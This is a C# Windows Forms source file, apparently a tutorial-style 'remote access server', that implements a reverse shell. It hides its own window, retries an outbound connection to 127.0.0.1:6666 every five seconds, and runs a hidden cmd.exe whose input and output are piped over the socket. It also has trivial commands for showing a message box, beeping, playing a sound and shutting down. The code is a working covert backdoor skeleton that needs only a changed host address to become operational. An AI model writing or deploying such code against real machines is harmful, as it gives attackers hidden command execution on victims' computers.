using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using System.IO; //for Streams
using System.Diagnostics; //for Process
using System.Threading; //to run commands concurrently

namespace remote_access_server
{
    public partial class Form1 : Form
    {
        TcpClient tcpClient;
        NetworkStream networkStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        Process processCmd;
        StringBuilder strInput;

        Thread th_message, th_beep, th_playsound;

        //Commands from Client in enumeration format:
        private enum command
        {
            HELP = 1,
            MESSAGE = 2,
            BEEP = 3,
            PLAYSOUND = 4,
            SHUTDOWNSERVER = 5
        }

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            this.Hide();
            for (; ; )
            {
                RunServer();
                System.Threading.Thread.Sleep(5000); //Wait 5 seconds then try again
            }
        }

        private void RunServer()
        {
            tcpClient = new TcpClient();
            strInput = new StringBuilder();

            if (!tcpClient.Connected)
            {
                try
                {
                    tcpClient.Connect("127.0.0.1", 6666);
                    networkStream = tcpClient.GetStream();
                    streamReader = new StreamReader(networkStream);
                    streamWriter = new StreamWriter(networkStream);
                }
                catch (Exception err) { return; } //if no Client don't continue

                processCmd = new Process();
                processCmd.StartInfo.FileName = "cmd.exe";
                processCmd.StartInfo.CreateNoWindow = true;
                processCmd.StartInfo.UseShellExecute = false;
                processCmd.StartInfo.RedirectStandardOutput = true;
                processCmd.StartInfo.RedirectStandardInput = true;
                processCmd.StartInfo.RedirectStandardError = true;
                processCmd.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                processCmd.Start();
                processCmd.BeginOutputReadLine();
            }

            while (true)
            {
                try
                {
                    string line = streamReader.ReadLine();
                    Int16 intCommand = 0;


                    //The Client may send junk characters apart from numbers
                    //therefore, we need to extract those numbers
                    intCommand = GetCommandFromLine(line);


                    //Here is where the commands get processed
                    //Each command is an enumeration declared
                    //earlier, each being an integer

                    switch ((command)intCommand)
                    {
                        case command.MESSAGE:
                            th_message =
                            new Thread(new ThreadStart(MessageCommand));
                            th_message.Start(); break;
                        case command.BEEP:
                            th_beep = new Thread(new ThreadStart(BeepCommand));
                            th_beep.Start(); break;
                        case command.PLAYSOUND:
                            th_playsound = new Thread(new ThreadStart(PlaySoundCommand));
                            th_playsound.Start(); break;
                        case command.SHUTDOWNSERVER:
                            streamWriter.Flush();
                            Cleanup();
                            System.Environment.Exit(System.Environment.ExitCode);
                            break;
                    }

                    strInput.Append(line);
                    strInput.Append("\n");
                    if (strInput.ToString().LastIndexOf("terminate") >= 0) StopServer();
                    if (strInput.ToString().LastIndexOf("exit") >= 0) throw new ArgumentException();
                    processCmd.StandardInput.WriteLine(strInput);
                    strInput.Remove(0, strInput.Length);
                }
                catch (Exception err)
                {
                    Cleanup();
                    break;
                }
            }//--end of while loop
        }//--end of RunServer()

        private void MessageCommand()
        {
            MessageBox.Show("Hello World");
        }

        private void BeepCommand()
        {
            Console.Beep(500, 2000);
        }

        private void PlaySoundCommand()
        {
            System.Media.SoundPlayer soundPlayer = new System.Media.SoundPlayer();
            soundPlayer.SoundLocation = @"C:\Windows\Media\chimes.wav";
            soundPlayer.Play();
        }

        private void Cleanup()
        {
            try { processCmd.Kill(); } catch (Exception err) { };
            streamReader.Close();
            streamWriter.Close();
            networkStream.Close();
        }
        private void StopServer()
        {
            Cleanup();
            System.Environment.Exit(System.Environment.ExitCode);
        }

        //The string 'line' passed from the while-loop contains junk
        //characters, is stored in the local variable as string 'strline'
        //This method then iterates through each character and extracts
        //the numbers and finally converts it into an integer and returns
        //the integer to the while-loop
        private Int16 GetCommandFromLine(string strline)
        {
            Int16 intExtractedCommand = 0;
            int i; Char character;
            StringBuilder stringBuilder = new StringBuilder();
            //Sanity Check: Extracts all the numbers from the stream
            //Iterate through each character in the string and if it
            //is an integer, copy it out to stringBuilder string.
            for (i = 0; i < strline.Length; i++)
            {
                character = Convert.ToChar(strline[i]);
                if (Char.IsDigit(character))
                {
                    stringBuilder.Append(character);
                }
            }
            //Convert the stringBuilder string of numbers to integer
            try
            {
                intExtractedCommand =
                Convert.ToInt16(stringBuilder.ToString());
            }
            catch (Exception err) { }
            return intExtractedCommand;
        }

        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }
    }
}
